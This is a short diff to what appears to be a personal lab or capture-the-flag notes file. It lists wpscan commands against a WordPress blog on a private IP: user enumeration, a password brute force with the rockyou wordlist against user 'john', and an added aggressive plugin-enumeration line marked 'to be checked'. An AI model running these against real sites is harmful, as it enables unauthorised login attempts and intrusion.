@@ -6,4 +6,9 @@ wpscan --disable-tls-checks --url https://192.168.1.6:12380/blogblog -e u\
 #2 - Bruteforce wp login page
 wpscan --disable-tls-checks --url https://192.168.1.6:12380/blogblog -P /usr/share/wordlists/rockyou.txt --usernames john
 
+#3 - Enumerating wordpress users and plugins
+wpscan --disable-tls-checks --url https://192.168.1.30:12380/blogblog/ --plugin-agressive (To be checked)
+
+
+
 
